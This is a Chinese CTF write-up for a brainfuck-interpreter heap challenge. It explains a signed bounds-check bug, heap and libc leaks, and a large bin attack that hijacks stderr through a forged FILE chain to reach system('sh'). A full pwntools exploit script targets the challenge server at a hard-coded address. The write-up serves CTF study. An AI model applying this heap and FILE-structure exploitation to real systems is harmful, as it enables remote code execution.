### 漏洞

每次数据指针加一时都会判断有无越界，条件判断用的是`jg`，是有符号判断，因此数据指针减至负数就可以越界写

```assembly
pwndbg> x/32xi 0x7ffff7fba000
   0x7ffff7fba000:      mov    rax,QWORD PTR [rdi+0x8]
   0x7ffff7fba004:      mov    rbx,QWORD PTR [rdi+0x10]
   0x7ffff7fba008:      inc    rbx
   0x7ffff7fba00b:      cmp    rax,rbx
   0x7ffff7fba00e:      jg     0x7ffff7fba052 <--
```



### 利用

1.利用large bin attack 修改`stderr`为可控堆地址

2.构造IO链，具体可参考 [house of apple 2](https://bbs.pediy.com/thread-273832.htm)

3.利用`__malloc_assert`触发IO流

##### 泄露heap和libc

数据指针加到0x10以后，tcache中会有chunk，把指针减到对应负数就可以泄露heap地址。

指针加到0x800时，之前使用的0x810大小的chunk会被放到unsorted bin中，同样可以泄露libc

##### large bin attack

与普通的large bin attack 不同的是，每次malloc的chunk大小都是之前的2倍，而large bin attack所需要的两个chunk，必须是在同一组大小（例如0x800,0x810），所以需要伪造unsorted bin chunk的大小。

我的做法是指针先加到0x400，使用`?`选项防止chunk合并。

再加到0x1000，这时的bin，在unsorted bin（chunk A）中的是0x1010大小，large bin 中是0x810（chunk B)。

![image-20221212190816161](./img/image-20221212190816161.png)

在chunk A中伪造一个0x800大小的chunk，

修改chunk B的bk_size为stderr_addr-0x20，伪造 _IO_FILE结构体，设置相关字段能过check就行，设置vtable为`_IO_wfile_jumps-(0x60-0x18)`，伪造`_IO_wide_data`结构体，同样设置相关字段和vtable，

指针加到0x2000，触发large bin attack，stderr被修改为chunk A的地址，

![image-20221212211613592](./img/image-20221212211613592.png)

最后修改chunk A的size的A位，再次使用large bin attack，程序会因为malloc.c:4105的check过不了而触发__malloc_assert，最终调用`system("sh")`

![image-20221212211848111](./img/image-20221212211848111.png)



##### trick

使用 ` ,[>>>>>>>>,]`类似格式的代码来实现无限制读写以及指针加减，这种做法可能会改变chunk的一些字段，注意修改就行。



##### 赛后

赛后了解到一种思路是利用越界写去修改tcache的entries和counts从而实现任意地址申请，但是这样做只能申请一次，之后会因为malloc的check过不了而无法申请。

其实最开始bss段上的结构体我是放在mmap的内存上的，之后考虑到了这个思路就放到bss上了，也把mmap的内存权限改为只能执行。



### exp

```python
#!/usr/bin/python3
from pwncli import *

context.terminal = ['tmux','splitw','-h']
context.arch="amd64"
context.log_level="debug"

def debug(addr=-1,PIE=True):
    if addr == -1:
        gdb.attach(p)
    else:
        if PIE:
            gdb.attach(p,'''b *$rebase({})
                            directory /usr/src/glibc/glibc-2.35/
                            b ./malloc/malloc.c:306
                            c
                            '''.format(hex(addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr))) 


def log(strr,addr):
    info("\033[0;31m{} --> {}\033[0m".format(strr,hex(addr)))

code = b""
data = b""
data2 = b""

def ptr_add(x, pad=b'a', step=8):
    global code
    global data
    code += b",[" + b'>'*step + b",]"
    data += pad*(x//step) + b'\x00'

def ptr_add2(x, pad=b'a', step=8):
    global code
    global data2
    code += b",[" + b'>'*step + b",]"
    data2 += pad*(x//step) + b'\x00'

def ptr_sub(x, pad=b'a', step = 8):
    global code
    global data
    code += b",[" + b'<'*step + b",]"
    data += pad*(x//step) + b'\x00'

def ptr_sub2(x, pad=b'a', step = 8):
    global code
    global data2
    code += b",[" + b'<'*step + b",]"
    data2 += pad*(x//step) + b'\x00'

def write_bytes(x):
    global code
    global data
    code += b".>"*x

def read_bytes(content, forword=False):
    global code
    global data
    if forword:
        code += b',>'*len(content)
    else:
        code += b','*len(content)
    data += content

def read_bytes2(content, forword=False):
    global code
    global data2
    if forword:
        code += b',>'*len(content)
    else:
        code += b','*len(content)
    data2 += content

def main():
    
    global code
    global data
    global p
    global data2

    p=remote('119.13.89.159',3301)
    #p=remote('0.0.0.0', 3344 )
    #p = process("./bfc")
    
    ptr_add(0x20)
    ptr_sub(0x20+0x10+0x18, b'\x90')
    code += b'<'*8
    # 泄露heap
    write_bytes(0x8)
    ptr_add(0x18+0x10+0x400)
    # 防止chunk合并
    code += b'??'
    ptr_add(0x400)
    ptr_sub(0x800+0x10+0x800+0x20, b'\xe0', 0x10)
    read_bytes(b'\xe0')
    # 泄露 libc
    write_bytes(0x8)
    code += b'>'*0x8

    ptr_add(0x800+0x20, b'\x10', 0x10)

    ptr_add(0x1000)
    ptr_sub(0x1000+0x10+(0x1000)+0x8, b'\xe0')

    ptr_sub(0x28+0x800-0x18)
    # 伪造 bk_size
    read_bytes2(p64(u64_ex("bk_size")), True)
    ptr_add2(0x800-0x20+0x10, b'\x10')
    read_bytes2(b'\x20')
    ptr_add2(0x18)
    # 伪造一个比largebin中的chunk小的chunk
    read_bytes2(p64(0x801), True)
    
    ptr_add2(0x7f0-0x20+0x20, b'\xe0')
    read_bytes2(p64(0x800)+p64(0x20), True)
    ptr_add2(0x820, b'\x11')

    ptr_add2(0x2000-0x10)
    # 回到 伪造的 0x800 chunk
    ptr_sub2(0x2000+0x10+0x2000-0x10, b'\x10', 0x10)
    ptr_sub2(0x20+0x1000+0x10, b'\x11', 0x10)
    # 伪造 IO_FILE 结构体
    # set f->flags
    read_bytes2(p64(u64_ex("  sh")), True)
    # 设置size 的 A 位用于触发 _int_malloc 中 的 assert
    read_bytes2(p64(0x811|4), True)
    # set f->_lock
    ptr_add2(0x88-0x10)
    read_bytes2(p64(u64_ex("_lock")), True)
    # set f->_wide_data
    ptr_add2(0xa0-0x90, b'\xd0', 0x10)
    read_bytes2(p64(u64_ex("widedata")), True)
    ptr_add2(0x30)
    # set f->vtable
    read_bytes2(p64(u64_ex("fvtable")), True)
    # 返回到 0x2000 chunk (在 unsorted bin 中) 
    ptr_add2(0xf30, b'\x11', 0x10)
    # 伪造一个 0x820 chunk 
    code += b'>'*0x8
    read_bytes2(p64(0x821), True)
    # 修复 fd
    ptr_add2(0x810, b'\xe0', 0x10)
    # set prev_size and size
    read_bytes2(p64(0x820), True)
    read_bytes2(p64(0x60), True)

    ## 移动至 0x4000 chunk
    ptr_add2(0x1800-0x10)
    # 伪造 _wide_data
    ptr_add2(0x18)
    # set _wide_data->_IO_write_base
    read_bytes2(p64(0), True)
    # 
    ptr_add2(0x10)
    # set _wide_data->_IO_buf_base
    read_bytes2(p64(0), True)
    ptr_add2(0xe0-0x30-0x8)
    read_bytes2(p64(u64_ex("wvtable")),True)
    read_bytes2(p64(u64_ex("system")),True)
    ptr_add2(0x4000-0xf0)

    #debug(0x2D59)
    p.sendlineafter(b":",str(len(code)))
    p.sendlineafter(b":", code)
    sleep(0.1)
    
    p.send(data)

    sleep(1)
    heap_base = (u64(p.recv(8)) << 12) - 0x13000
    log("heap_base", heap_base)

    libc_base = u64(p.recv(8)) - 0x219ce0
    log("libc_base", libc_base)
    log("_wide_data", libc_base+0x156b0+0x1000)

    stderr_addr = libc_base + 0x21a860 # 0x21a6a0
    _IO_wfile_jumps = libc_base +  0x2160c0
    fake_wide_data = heap_base + 0x176d0
    _lock_addr = libc_base + (0x7f5eea04da60-0x7f5ee9e32000)
	# 修复相关地址
    data2 = data2.replace(p64(u64_ex("bk_size")), p64(stderr_addr-0x20))
    data2 = data2.replace(p64(u64_ex("widedata")), p64(fake_wide_data))
    data2 = data2.replace(p64(u64_ex("fvtable")), p64(_IO_wfile_jumps-(0x60-0x18)))
    data2 = data2.replace(p64(u64_ex("wvtable")), p64(fake_wide_data+(0xe0+0x8-0x68)))
    data2 = data2.replace(p64(u64_ex("system")), p64(libc_base + libc.sym["system"]))
    data2 = data2.replace(p64(u64_ex("_lock")), p64(_lock_addr))
    log("system", libc_base + libc.sym["system"])
    log("fake_wide_data",fake_wide_data)

    p.sendline(data2)
    
    p.interactive()


if __name__ == "__main__":
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    libc = ELF('./libc.so.6',checksec=False)
    main()
```

